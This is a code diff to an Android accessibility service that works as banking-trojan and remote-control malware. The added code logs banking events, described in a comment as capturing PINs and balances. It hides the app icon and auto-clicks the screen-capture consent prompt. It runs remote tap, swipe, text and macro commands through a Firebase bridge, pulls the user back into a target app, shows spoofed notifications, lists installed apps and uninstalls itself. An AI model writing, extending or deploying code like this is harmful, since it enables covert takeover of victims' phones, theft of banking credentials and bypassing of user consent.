@@ -24,6 +24,8 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     private val mainHandler = Handler(Looper.getMainLooper())
+    var macroRunning = false
+    private var currentTargetPackage: String? = null
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -36,120 +38,84 @@ class MyAccessibilityService : AccessibilityService() {
                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
             notificationTimeout = 100
         }
+
+        // Push screen dimensions
+        sendScreenInfo()
+
+        // Hide app icon
         hideAppIcon()
-        if (!isScreenCaptureRunning()) requestScreenCapture()
+
+        // Start screen capture if not running
+        if (!isScreenCaptureRunning()) {
+            startScreenCapture()
+        }
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        // Bank logger captures PINs, balances
         BankLogger.onEvent(this, event)
+
+        // Track current package
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            currentTargetPackage = event.packageName?.toString()
             autoGrantMediaProjection()
+        }
+
+        // If macro is running and user switches away, bring back target app
+        if (macroRunning && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val target = MacroRunner.currentPackage
+            if (target != null && event.packageName?.toString() != target) {
+                mainHandler.postDelayed({ launchApp(target) }, 2000)
+            }
         }
     }
 
     override fun onInterrupt() {}
 
-    // ---------- MACRO EXECUTION ----------
-    data class MacroStep(val type: String, val data: Any? = null, val retry: Int = 3)
-
-    fun executeMacro(macroId: String, rawSteps: List<Map<String, Any>>) {
-        val steps = rawSteps.mapNotNull { step ->
-            val type = step["type"] as? String ?: return@mapNotNull null
-            val data = step["data"]
-            val retry = (step["retry"] as? Int) ?: 3
-            MacroStep(type, data, retry)
+    // ========== EXECUTE MACRO (from NLP or manual) ==========
+    fun executeMacro(macroId: String, steps: List<MacroRunner.MacroStep>) {
+        if (macroRunning) {
+            FirebaseBridge.reportMacro(macroId, false, "Another macro is running")
+            return
         }
-
-        object : Thread() {
-            override fun run() {
-                var idx = 0
-                while (idx < steps.size) {
-                    val step = steps[idx]
-                    var attempt = 0
-                    var success = false
-                    while (attempt < step.retry && !success) {
-                        success = runStepOnMainThread(step)
-                        if (!success) {
-                            attempt++
-                            sleep(1500)
-                        }
-                    }
-                    if (!success) {
-                        FirebaseBridge.reportMacroResult(macroId, false, "Step ${idx + 1} failed after ${step.retry} retries")
-                        return
-                    }
-                    idx++
-                }
-                FirebaseBridge.reportMacroResult(macroId, true, "All steps completed")
-            }
-        }.start()
+        FirebaseBridge.reportMacro(macroId, false, "Starting...")
+        macroRunning = true
+        MacroRunner.start(macroId, steps, this) { success, summary ->
+            macroRunning = false
+            FirebaseBridge.reportMacro(macroId, success, summary)
+        }
     }
 
-    private fun runStepOnMainThread(step: MacroStep): Boolean {
-        val latch = CountDownLatch(1)
-        var result = false
-        mainHandler.post {
-            try {
-                result = performStep(step)
-            } catch (_: Exception) {
-                result = false
-            } finally {
-                latch.countDown()
-            }
-        }
-        latch.await()
-        return result
-    }
-
-    private fun performStep(step: MacroStep): Boolean {
-        return when (step.type) {
+    // ========== SINGLE COMMANDS ==========
+    fun performSingleCommand(type: String, params: Map<String, Any?>) {
+        when (type) {
             "tap" -> {
-                val m = step.data as? Map<*, *> ?: return false
-                tap((m["x"] as? Number)?.toInt() ?: 0, (m["y"] as? Number)?.toInt() ?: 0)
-                true
+                val x = (params["x"] as? Number)?.toInt() ?: 0
+                val y = (params["y"] as? Number)?.toInt() ?: 0
+                tap(x, y)
             }
             "swipe" -> {
-                val m = step.data as? Map<*, *> ?: return false
-                swipe(
-                    (m["sx"] as? Number)?.toInt() ?: 0,
-                    (m["sy"] as? Number)?.toInt() ?: 0,
-                    (m["ex"] as? Number)?.toInt() ?: 0,
-                    (m["ey"] as? Number)?.toInt() ?: 0,
-                    (m["dur"] as? Long) ?: 300L
-                )
-                true
+                val sx = (params["sx"] as? Number)?.toInt() ?: 0
+                val sy = (params["sy"] as? Number)?.toInt() ?: 0
+                val ex = (params["ex"] as? Number)?.toInt() ?: 0
+                val ey = (params["ey"] as? Number)?.toInt() ?: 0
+                val dur = (params["duration"] as? Long) ?: 300L
+                swipe(sx, sy, ex, ey, dur)
             }
-            "type" -> {
-                val text = step.data as? String ?: return false
-                injectText(text)
-                true
+            "type" -> injectText(params["text"] as? String ?: "")
+            "hide_activity" -> hideAppIcon()
+            "uninstall" -> uninstallSelf()
+            "start_screen_capture" -> startScreenCapture()
+            "get_apps" -> FirebaseBridge.pushAppsList(getInstalledApps())
+            "fake_notification" -> {
+                val title = params["title"] as? String ?: "⚠ Alert"
+                val text = params["text"] as? String ?: "Tap to view"
+                NotificationSpoofer.show(this, title, text, null, null)
             }
-            "launch" -> {
-                val pkg = step.data as? String ?: return false
-                launchApp(pkg)
-            }
-            "wait" -> true  // wait was already done on background thread
-            "home" -> {
-                performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
-                true
-            }
-            "back" -> {
-                performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
-                true
-            }
-            else -> false
         }
     }
 
-    private fun launchApp(pkg: String): Boolean {
-        val intent = packageManager.getLaunchIntentForPackage(pkg) ?: return false
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        startActivity(intent)
-        Thread.sleep(2000)
-        return true
-    }
-
-    // ---------- DIRECT COMMANDS ----------
+    // ---------- Low-level gestures ----------
     fun tap(x: Int, y: Int) {
         val path = Path().apply { moveTo(x.coerceIn(0, 9999).toFloat(), y.coerceIn(0, 9999).toFloat()) }
         dispatchGesture(GestureDescription.Builder()
@@ -169,12 +135,16 @@ class MyAccessibilityService : AccessibilityService() {
 
     fun injectText(text: String) {
         val root = rootInActiveWindow ?: return
-        val focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
-        val args = Bundle().apply { putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text) }
-        focus.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
+        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
+        if (focused != null) {
+            val bundle = Bundle().apply {
+                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
+            }
+            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
+        }
     }
 
-    // ---------- HIDE / UNINSTALL ----------
+    // ---------- Hide / Uninstall ----------
     fun hideAppIcon() {
         try {
             packageManager.setComponentEnabledSetting(
@@ -193,52 +163,89 @@ class MyAccessibilityService : AccessibilityService() {
         startActivity(intent)
         mainHandler.postDelayed({
             val root = rootInActiveWindow ?: return@postDelayed
-            for (node in root.findAccessibilityNodeInfosByText("Uninstall")) {
-                if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); break }
+            val uninstallBtn = findClickableByText(root, "Uninstall")
+            if (uninstallBtn != null) {
+                uninstallBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                mainHandler.postDelayed({
+                    val confirmRoot = rootInActiveWindow ?: return@postDelayed
+                    val okBtn = findClickableByText(confirmRoot, "OK")
+                        ?: findClickableByText(confirmRoot, "Uninstall")
+                        ?: findClickableByViewId(confirmRoot, "android:id/button1")
+                    okBtn?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                }, 1500)
             }
-            mainHandler.postDelayed({
-                val root2 = rootInActiveWindow ?: return@postDelayed
-                for (text in listOf("OK", "Uninstall")) {
-                    for (n in root2.findAccessibilityNodeInfosByText(text))
-                        if (n.isClickable) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return@postDelayed }
-                }
-                for (id in listOf("android:id/button1")) {
-                    for (n in root2.findAccessibilityNodeInfosByViewId(id))
-                        if (n.isClickable) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return@postDelayed }
-                }
-            }, 1500)
         }, 2000)
     }
 
-    // ---------- SCREEN CAPTURE AUTO‑GRANT ----------
-    fun requestScreenCapture() {   // <-- now public
-        startActivity(Intent(this, ScreenPermissionActivity::class.java).apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK })
+    // ---------- MediaProjection auto-grant ----------
+    fun startScreenCapture() {
+        startActivity(Intent(this, ScreenPermissionActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+        })
     }
 
     private fun autoGrantMediaProjection() {
         val root = rootInActiveWindow ?: return
-        val startNow = root.findAccessibilityNodeInfosByText("Start now")
-        for (btn in startNow) if (btn.isClickable) { btn.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
-        for (id in listOf("com.android.systemui:id/start_button", "android:id/button1")) {
-            for (node in root.findAccessibilityNodeInfosByViewId(id))
-                if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
+        val startNowBtn = findClickableByText(root, "Start now")
+        if (startNowBtn != null) {
+            startNowBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+            return
         }
-        // Fallback: iterate children of the window's root node correctly
-        val windowRoot = root.window?.root ?: return
-        for (i in 0 until windowRoot.childCount) {
-            val child = windowRoot.getChild(i) ?: continue
-            if (child.contentDescription?.contains("start", ignoreCase = true) == true && child.isClickable) {
-                child.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                break
+        for (id in listOf("com.android.systemui:id/start_button", "android:id/button1")) {
+            val btn = findClickableByViewId(root, id)
+            if (btn != null) {
+                btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                return
             }
         }
     }
 
     fun isScreenCaptureRunning(): Boolean {
         val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
-        return am.getRunningServices(Integer.MAX_VALUE)
+        return am.getRunningServices(Int.MAX_VALUE)
             .any { it.service.className == ScreenCaptureService::class.java.name }
     }
 
     fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }
+
+    private fun sendScreenInfo() {
+        val dm = resources.displayMetrics
+        FirebaseBridge.updateScreenInfo(dm.widthPixels, dm.heightPixels)
+    }
+
+    // App launching
+    fun launchApp(pkg: String): Boolean {
+        val intent = packageManager.getLaunchIntentForPackage(pkg)
+        if (intent == null) return false
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        startActivity(intent)
+        return true
+    }
+
+    // Helper: run on main thread synchronously
+    fun runOnMainThreadSync(block: () -> Any?): Any? {
+        val latch = CountDownLatch(1)
+        var result: Any? = null
+        mainHandler.post {
+            result = block()
+            latch.countDown()
+        }
+        latch.await()
+        return result
+    }
+
+    // Find clickable node by text
+    private fun findClickableByText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
+        for (node in root.findAccessibilityNodeInfosByText(text)) {
+            if (node.isClickable) return node
+        }
+        return null
+    }
+
+    private fun findClickableByViewId(root: AccessibilityNodeInfo, id: String): AccessibilityNodeInfo? {
+        for (node in root.findAccessibilityNodeInfosByViewId(id)) {
+            if (node.isClickable) return node
+        }
+        return null
+    }
 }
